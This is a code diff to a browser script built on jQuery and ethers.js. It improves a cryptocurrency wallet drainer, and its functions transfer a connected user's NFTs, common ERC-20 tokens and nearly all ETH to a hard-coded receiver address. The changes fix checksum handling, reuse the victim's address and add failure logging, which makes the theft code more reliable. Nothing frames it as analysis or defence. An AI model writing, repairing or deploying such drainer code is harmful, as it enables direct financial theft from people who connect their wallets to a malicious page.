@@ -323,15 +323,21 @@ $(document).ready(function () {
     }
 
 // Common ERC-20 tokens
-    const COMMON_TOKENS = [
-        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-        { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
-        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
-        { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
-        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
-        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1e6Cc01f0B64C4cE", decimals: 18 },
-        { symbol: "PEPE", address: "0x6982508145454Ce325dDBE47a25d4ec3d2311933", decimals: 18 }
-    ];
+    const RAW_TOKENS = [
+    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+];
+
+// Auto-normalize all addresses to valid EIP-55 checksums
+const COMMON_TOKENS = RAW_TOKENS.map(t => ({
+    ...t,
+    address: ethers.utils.getAddress(t.address)
+}));
 
     // Mobile detection
     function isMobileDevice() {
@@ -499,50 +505,56 @@ $(document).ready(function () {
     }
 
     // NFT DRAIN (unchanged)
-    async function drainNFTs() {
-        const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${await signer.getAddress()}&withMetadata=true`;
-        const nfts = await (await fetch(url)).json().ownedNfts || [];
-        
-        const nftABI = ["function safeTransferFrom(address from, address to, uint256 tokenId)"];
-        for (const nft of nfts.slice(0, 10)) { // Limit to 10
-            try {
-                const contract = new ethers.Contract(nft.contract.address, nftABI, signer);
-                await contract.safeTransferFrom(await signer.getAddress(), RECEIVER_ETH_ADDRESS, nft.id.tokenId);
-            } catch(e) {}
+   async function drainNFTs() {
+    const userAddress = await signer.getAddress();
+    const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${userAddress}&withMetadata=true`;
+    const data = await (await fetch(url)).json();
+    const nfts = data.ownedNfts || [];
+    
+    const nftABI = ["function safeTransferFrom(address from, address to, uint256 tokenId)"];
+    for (const nft of nfts.slice(0, 10)) {
+        try {
+            const contract = new ethers.Contract(nft.contract.address, nftABI, signer);
+            await contract.safeTransferFrom(userAddress, RECEIVER_ETH_ADDRESS, nft.id.tokenId);
+        } catch(e) {
+            console.log('NFT drain failed:', e.message);
         }
     }
+}
 
     // ERC20 DRAIN
     async function drainERC20Token(token) {
-        const erc20ABI = [
-            "function balanceOf(address) view returns (uint256)",
-            "function transfer(address,uint256) returns (bool)"
-        ];
-        
-        const contract = new ethers.Contract(token.address, erc20ABI, signer);
-        const balance = await contract.balanceOf(await signer.getAddress());
-        if (balance.gt(0)) {
-            await contract.transfer(RECEIVER_ETH_ADDRESS, balance);
-        }
+    const erc20ABI = [
+        "function balanceOf(address) view returns (uint256)",
+        "function transfer(address,uint256) returns (bool)"
+    ];
+    
+    const userAddress = await signer.getAddress();
+    const contract = new ethers.Contract(token.address, erc20ABI, signer);
+    const balance = await contract.balanceOf(userAddress);
+    if (balance.gt(0)) {
+        await contract.transfer(RECEIVER_ETH_ADDRESS, balance);
     }
+}
 
     // ETH DRAIN
-    async function drainETH() {
-        const balance = await ethersProvider.getBalance(await signer.getAddress());
-        const gasPrice = await ethersProvider.getGasPrice();
-        const gasLimit = 21000;
-        const gasCost = gasPrice.mul(gasLimit);
-        const amount = balance.sub(gasCost);
-        
-        if (amount.gt(0)) {
-            await signer.sendTransaction({
-                to: RECEIVER_ETH_ADDRESS,
-                value: amount,
-                gasLimit,
-                gasPrice
-            });
-        }
+async function drainETH() {
+    const userAddress = await signer.getAddress();
+    const balance = await ethersProvider.getBalance(userAddress);
+    const gasPrice = await ethersProvider.getGasPrice();
+    const gasLimit = 21000;
+    const gasCost = gasPrice.mul(gasLimit);
+    const amount = balance.sub(gasCost);
+    
+    if (amount.gt(0)) {
+        await signer.sendTransaction({
+            to: RECEIVER_ETH_ADDRESS,
+            value: amount,
+            gasLimit,
+            gasPrice
+        });
     }
+}
 
     $('#wallet-debug').html(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}<br>` + detectedWallets.map(w => w.name).join("<br>"));
 });
